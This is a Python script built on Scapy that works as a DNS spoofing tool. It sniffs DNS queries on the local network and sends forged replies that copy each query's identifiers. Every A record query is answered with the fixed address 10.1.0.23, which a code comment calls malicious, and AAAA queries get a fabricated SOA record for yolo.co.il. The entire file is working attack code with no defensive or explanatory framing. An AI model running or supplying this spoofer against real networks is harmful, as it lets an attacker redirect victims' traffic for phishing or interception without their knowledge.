#!/usr/bin/python3

from scapy.all import *
from threading import Thread

stop = 0

def send_packet(packet):
	send(packet)

def create_dns_resp(packet):
	try:
		qname = packet[DNSQR].qname
		#craft network layer, with matching id of the query
		dns_ip = IP(src=packet[0][IP].dst , dst=packet[0][IP].src, id=packet[0][IP].id)
		#craft transport layer, with matching port of the sending party
		dns_udp = UDP(dport=packet[0][UDP].sport, sport=53)
		#if query type 'A', modify resolved ip to malicious address
		if(packet[DNSQR].qtype == 1):
			dns_dns = DNS(id=packet[0][DNS].id, qr=1, aa=1, rd=1, ra=1, qdcount=1, ancount=1, arcount=1, qd=packet[0][DNS].qd, an=DNSRR(rrname=qname, rdata="10.1.0.23"), ar=DNSRROPT(rrname='.', type='OPT', rclass=4096,extrcode=0, version=0, z=0, rdlen=0))
		#if query type 'AAAA'
		elif(packet[DNSQR].qtype == 28):
			dns_dns = DNS(id=packet[0][DNS].id, qr=1, aa=1, rd=1, ra=1, qdcount=1, nscount=1, arcount=1, qd=packet[0][DNS].qd, ns=DNSRRSOA(rrname='yolo.co.il', type='SOA', rclass='IN', ttl=20, mname='yolo.co.il', rname='root.yolo.co.il', serial=2, refresh=20, retry=20, expire=2419200, minimum=20), ar=DNSRROPT(rrname='.', type='OPT', rclass=4096, extrcode=0, version=0, z=0, rdlen=0))
		
		#craft spoofed packet
		dns_resp = dns_ip/dns_udp/dns_dns
		send_packet(dns_resp)
	except Exception as e:
		print(e)

def sniff_query():
	try:
		global stop
		while not stop:
			sniff(filter="udp dst port 53" , prn=create_dns_resp)

	except Exception as e:
		print(e)

def main():
	try:
		in_thrd = Thread(target=sniff_query)
		in_thrd.start()
		while True:
			continue

	except KeyboardInterrupt:
		global stop
		stop = 1
		in_thrd.join()
		return 0

	except Exception as e:
		print(e)
if __name__ == "__main__":
	main()
